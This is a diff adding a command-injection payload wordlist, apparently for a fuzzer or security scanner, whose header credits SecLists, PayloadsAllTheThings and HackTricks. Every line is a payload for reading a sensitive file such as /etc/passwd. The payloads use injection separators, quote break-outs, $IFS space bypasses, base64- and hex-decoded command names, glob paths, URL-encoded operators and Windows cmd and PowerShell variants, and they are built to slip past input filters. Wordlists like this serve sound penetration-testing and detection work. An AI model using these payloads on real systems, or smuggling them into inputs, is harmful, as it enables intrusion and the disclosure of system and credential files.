@@ -1,0 +1,256 @@
+# File-read / display payloads. Placeholder: {FILE}
+# Reading a known-sensitive file (classically /etc/passwd) is a benign proof
+# of command execution and arbitrary file read. Techniques below are drawn
+# from SecLists, PayloadsAllTheThings and HackTricks: alternate read tools,
+# command-name obfuscation, $IFS/space bypass, wildcard/glob paths, decoders,
+# injection separators, quote break-outs, URL-encoded operators and Windows.
+# One payload per line; blank lines and lines starting with '#' are ignored.
+# Most bypass tricks assume a bash/sh target; {FILE} is always the literal path.
+
+# ============================================================
+# 1. direct read -- coreutils and common tools (full content)
+# ============================================================
+cat {FILE}
+cat -- {FILE}
+/bin/cat {FILE}
+/usr/bin/cat {FILE}
+tac {FILE}
+nl {FILE}
+nl -ba {FILE}
+tail -n +1 {FILE}
+tail -c +1 {FILE}
+sed '' {FILE}
+sed -n p {FILE}
+sed -n l {FILE}
+awk 1 {FILE}
+awk '{print}' {FILE}
+grep -a '' {FILE}
+grep -a . {FILE}
+grep -a -F '' {FILE}
+egrep -a '.*' {FILE}
+od -c {FILE}
+od -An -c {FILE}
+od -An -tx1 {FILE}
+xxd {FILE}
+xxd -p {FILE}
+hexdump -C {FILE}
+hexdump -v -e '/1 "%_p"' {FILE}
+strings -n 1 {FILE}
+base64 {FILE}
+base64 -w0 {FILE}
+base32 {FILE}
+openssl base64 -in {FILE}
+openssl enc -base64 -in {FILE}
+cut -c1- {FILE}
+cut -b1- {FILE}
+paste {FILE}
+paste -s {FILE}
+pr -t {FILE}
+fmt {FILE}
+fold {FILE}
+expand {FILE}
+column {FILE}
+rev {FILE}
+sort {FILE}
+shuf {FILE}
+dd if={FILE}
+dd if={FILE} 2>/dev/null
+diff {FILE} /dev/null
+comm -23 {FILE} /dev/null
+tee < {FILE}
+busybox cat {FILE}
+
+# ============================================================
+# 2. read via stdin redirection (no filename argument)
+# ============================================================
+cat<{FILE}
+cat < {FILE}
+tac<{FILE}
+nl<{FILE}
+rev<{FILE}
+sort<{FILE}
+head<{FILE}
+base64<{FILE}
+od -c<{FILE}
+xxd<{FILE}
+grep -a ''<{FILE}
+sed ''<{FILE}
+awk '1'<{FILE}
+
+# ============================================================
+# 3. shell builtins (no external binary)
+# ============================================================
+echo "$(<{FILE})"
+printf '%s\n' "$(<{FILE})"
+mapfile -t __a <{FILE}; printf '%s\n' "${__a[@]}"
+readarray __a <{FILE}; printf '%s' "${__a[@]}"
+while IFS= read -r __l; do printf '%s\n' "$__l"; done <{FILE}
+read -r -d '' __x <{FILE}; printf '%s' "$__x"
+exec 3<{FILE}; cat <&3; exec 3<&-
+
+# ============================================================
+# 4. interpreters
+# ============================================================
+python3 -c 'import sys;sys.stdout.write(open("{FILE}").read())'
+python3 -c 'print(open("{FILE}").read())'
+python -c 'print open("{FILE}").read()'
+perl -ne 'print' {FILE}
+perl -pe 0 {FILE}
+perl -e 'print <>' {FILE}
+php -r 'readfile("{FILE}");'
+php -r 'echo file_get_contents("{FILE}");'
+php -r 'echo implode(file("{FILE}"));'
+ruby -e 'puts File.read("{FILE}")'
+ruby -pe 0 {FILE}
+node -e 'process.stdout.write(require("fs").readFileSync("{FILE}","utf8"))'
+node -e 'console.log(require("fs").readFileSync("{FILE}").toString())'
+lua -e 'io.write(io.open("{FILE}"):read("*a"))'
+awk 'BEGIN{while((getline line<"{FILE}")>0)print line}'
+ed -s {FILE} <<< $',p\nQ'
+
+# ============================================================
+# 5. command-name obfuscation (quotes / backslash / concat)
+# ============================================================
+c'a't {FILE}
+c"a"t {FILE}
+ca''t {FILE}
+ca""t {FILE}
+'cat' {FILE}
+"cat" {FILE}
+\cat {FILE}
+c\at {FILE}
+ca\t {FILE}
+c\a\t {FILE}
+\c\a\t {FILE}
+c$@at {FILE}
+ca$@t {FILE}
+c${u}at {FILE}
+ca${u}t {FILE}
+$(echo cat) {FILE}
+`echo cat` {FILE}
+$(echo${IFS}cat) {FILE}
+
+# ============================================================
+# 6. wildcard / glob binary paths
+# ============================================================
+/bin/c?t {FILE}
+/bin/c[a]t {FILE}
+/bin/ca? {FILE}
+/bin/??t {FILE}
+/???/cat {FILE}
+/???/c?t {FILE}
+/b?n/cat {FILE}
+/bin/cat* {FILE}
+/usr/bin/c?t {FILE}
+{/bin/cat,{FILE}}
+
+# ============================================================
+# 7. decoders -- command name from base64 / hex / octal / rev / tr
+# ============================================================
+$(echo Y2F0|base64 -d) {FILE}
+$(echo${IFS}Y2F0|base64${IFS}-d) {FILE}
+$(printf Y2F0|base64 -d) {FILE}
+$(echo -n Y2F0|base64 -d) {FILE}
+$(printf '\x63\x61\x74') {FILE}
+$(printf '\143\141\164') {FILE}
+$(echo -e '\x63\x61\x74') {FILE}
+$(rev<<<tac) {FILE}
+$(tr '[A-Z]' '[a-z]'<<<CAT) {FILE}
+$(tr 'a-zA-Z' 'n-za-mN-ZA-M'<<<png) {FILE}
+
+# ============================================================
+# 8. space / $IFS bypass
+# ============================================================
+cat${IFS}{FILE}
+cat$IFS{FILE}
+cat$IFS$9{FILE}
+cat${IFS}${IFS}{FILE}
+cat$(printf '\t'){FILE}
+X=$IFS;cat${X}{FILE}
+{cat,{FILE}}
+{cat,-n,{FILE}}
+
+# ============================================================
+# 9. injection separators / chaining (break into a running command)
+# ============================================================
+; cat {FILE}
+;cat {FILE}
+& cat {FILE}
+&cat {FILE}
+&& cat {FILE}
+&&cat {FILE}
+| cat {FILE}
+|cat {FILE}
+|| cat {FILE}
+||cat {FILE}
+| cat {FILE} #
+; cat {FILE} ;
+`cat {FILE}`
+$(cat {FILE})
+$(cat${IFS}{FILE})
+`cat${IFS}{FILE}`
+%0acat {FILE}
+%0acat%20{FILE}
+%0dcat {FILE}
+%0d%0acat {FILE}
+%09cat%09{FILE}
+%0abash%09-c%09"cat%09{FILE}"%0a
+${LS_COLORS:10:1}${IFS}cat {FILE}
+
+# ============================================================
+# 10. quote / context break-out
+# ============================================================
+'; cat {FILE}; '
+'; cat {FILE} #
+"; cat {FILE}; "
+"; cat {FILE} #
+' && cat {FILE} && '
+" && cat {FILE} && "
+'|cat {FILE}|'
+"|cat {FILE}|"
+') ; cat {FILE} ; ('
+") ; cat {FILE} ; ("
+'$(cat {FILE})'
+"$(cat {FILE})"
+\'; cat {FILE}; \'
+
+# ============================================================
+# 11. URL-encoded operators (HTTP parameter contexts; {FILE} left raw)
+# ============================================================
+%3Bcat%20{FILE}
+%7Ccat%20{FILE}
+%26cat%20{FILE}
+%26%26cat%20{FILE}
+%60cat%20{FILE}%60
+%24%28cat%20{FILE}%29
+%0Acat%20{FILE}
+%0D%0Acat%20{FILE}
+%0Acat%09{FILE}
+%250Acat%20{FILE}
+cat%09{FILE}
+cat%24%7BIFS%7D{FILE}
+
+# ============================================================
+# 12. Windows (cmd.exe / PowerShell)
+# ============================================================
+type {FILE}
+type "{FILE}"
+more {FILE}
+more < {FILE}
+cmd /c type {FILE}
+findstr /r "^" {FILE}
+findstr /r ".*" {FILE}
+t^y^pe {FILE}
+ty^pe {FILE}
+"type" {FILE}
+ty"p"e {FILE}
+& type {FILE}
+| type {FILE}
+&& type {FILE}
+%0a type {FILE}
+powershell -c "Get-Content '{FILE}'"
+powershell -c "Get-Content -Raw '{FILE}'"
+powershell -c "gc '{FILE}'"
+powershell -c "cat '{FILE}'"
+powershell -c "[IO.File]::ReadAllText('{FILE}')"
+powershell -c "Get-Content '{FILE}'|Write-Output"
